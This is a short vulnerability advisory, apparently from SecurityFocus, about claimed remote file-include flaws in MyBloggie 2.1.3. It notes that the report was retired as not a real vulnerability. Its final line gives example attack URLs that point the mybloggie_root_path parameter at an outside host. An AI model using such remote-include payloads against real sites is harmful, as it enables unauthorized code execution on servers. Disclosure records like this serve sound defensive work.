@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/19449/info
+
+MyBloggie is prone to multiple remote file-include vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker can exploit these issues to include arbitrary remote files containing malicious PHP code and execute it in the context of the webserver process. This may allow the attacker to compromise the application and the underlying system; other attacks are also possible.
+
+MyBloggie 2.1.3 and earlier are vulnerable to this issue; other versions may also be affected.
+
+Update: Reports indicate that this is not a vulnerability because 'mybloggie_root_path' is defined as './' prior to its use in the vulnerable scripts. Therefore this BID is retired.
+
+http://www.example.com/[myBloggie]/index.php?mybloggie_root_path=http://www.example.com http://www.example.com/[myBloggie]/includes/db.php? mybloggie_root_path=http://www.example.com
